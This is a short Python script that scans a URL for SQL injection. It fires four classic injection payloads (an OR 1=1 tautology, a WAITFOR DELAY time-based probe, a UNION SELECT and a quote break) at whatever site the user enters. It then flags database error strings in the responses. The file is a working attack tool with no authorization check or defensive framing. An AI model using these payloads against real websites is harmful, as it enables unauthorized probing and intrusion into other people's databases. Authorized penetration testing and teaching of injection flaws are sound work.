import requests

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RESET = "\033[0m"

def geturl():
    while True:
        url = input("Enter URL(use * in injection point): ")
        if "*" in url:
            break
        else:
            print("Error: please enter '*' in injection point")

    if "https://" in url :
        pass
    else:
        url = f"https://{url}"
    return url
    
def scan():
    hit = 0
    for payload in payloads:
        Test = URL.replace("*", payload)
        print(f"{GREEN}Testing: {Test}{RESET}")
        try:
            
            response = requests.get(Test, timeout=10)
            print(f"{YELLOW}Status: {response.status_code}, length: {len(response.text)}{RESET}")
            for error in sql_errors:
                if error.lower() in response.text.lower():
                    print(f"{RED}^^^^^^^^^^  Possible SQL error found!!!  ^^^^^^^^^^{RESET}")
                    hit = hit + 1
        except Exception as e:
            print(f"{RED}Error: {e}")
    if hit == 0:
        print(f"{GREEN}Scan completed. No vulnerabilities identified.{RESET}")
    else:
        print(f"{GREEN}Scan completed.{RESET}")

payloads = [
    "' OR 1=1 --",
    "' OR '1'='1",
    "'; WAITFOR DELAY '0:0:5' --",
    "' UNION SELECT NULL--",
]

sql_errors = [
    "sql syntax", "mysql", "ORA-", "unexpected end of SQL command",
    "syntax error", "unterminated quoted string", "ODBC", "JDBC"
]

URL = geturl()
scan()

#made with <3 
#Toex
